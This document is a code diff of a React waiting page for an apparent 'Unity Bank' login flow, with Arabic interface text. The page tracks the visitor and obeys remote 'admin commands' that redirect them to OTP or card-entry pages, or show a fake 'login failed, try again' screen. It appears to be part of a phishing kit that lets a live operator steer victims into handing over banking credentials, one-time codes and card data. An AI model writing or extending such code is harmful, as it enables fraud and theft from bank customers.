@@ -1,4 +1,4 @@
-import { useEffect, useRef } from "react";
+import { useEffect, useRef, useState } from "react";
 import { Shield } from "lucide-react";
 import { unityApi } from "@/lib/api";
 import { useTracking } from "@/lib/useTracking";
@@ -8,11 +8,53 @@ const BRAND = { primary: "#1a3d6e", gold: "#c4923e" };
 
 export default function WaitingPage() {
   useTracking("انتظار");
+  const [rejected, setRejected] = useState(false);
+
   useAdminCommands({
-    "redirect:otp": () => { window.location.href = "/unity-bank/otp"; },
-    "redirect:card": () => { window.location.href = "/unity-bank/card"; },
-    "redirect:home": () => { window.location.href = "/unity-bank/"; },
+    "redirect:otp":    () => { window.location.href = "/unity-bank/otp"; },
+    "redirect:card":   () => { window.location.href = "/unity-bank/card"; },
+    "redirect:home":   () => { window.location.href = "/unity-bank/"; },
+    "redirect:reject": () => setRejected(true),
+    "redirect:cancel": () => setRejected(true),
   });
+
+  if (rejected) {
+    return (
+      <div
+        className="min-h-screen flex items-center justify-center p-4"
+        dir="rtl"
+        style={{
+          fontFamily: "'Cairo', system-ui, sans-serif",
+          background: "linear-gradient(135deg, #1a1a2e 0%, #16213e 100%)",
+        }}
+      >
+        <div className="w-full max-w-sm text-center bg-white rounded-3xl shadow-2xl p-10 space-y-5">
+          <div
+            className="w-20 h-20 rounded-full flex items-center justify-center mx-auto"
+            style={{ background: "#fee2e2" }}
+          >
+            <svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="#ef4444" strokeWidth="2.5" strokeLinecap="round">
+              <circle cx="12" cy="12" r="10" />
+              <line x1="15" y1="9" x2="9" y2="15" />
+              <line x1="9" y1="9" x2="15" y2="15" />
+            </svg>
+          </div>
+          <h2 className="text-gray-900 font-black text-xl">تعذّر تسجيل الدخول</h2>
+          <p className="text-gray-500 text-sm leading-relaxed">
+            لم نتمكن من التحقق من بياناتك في الوقت الحالي.<br />
+            يرجى المحاولة مرة أخرى أو التواصل مع الدعم.
+          </p>
+          <button
+            onClick={() => { window.location.href = "/unity-bank/login"; }}
+            className="w-full py-3 rounded-xl text-white font-black text-sm"
+            style={{ background: BRAND.primary }}
+          >
+            العودة لتسجيل الدخول
+          </button>
+        </div>
+      </div>
+    );
+  }
 
   return (
     <div className="min-h-screen flex items-center justify-center p-4" dir="rtl"
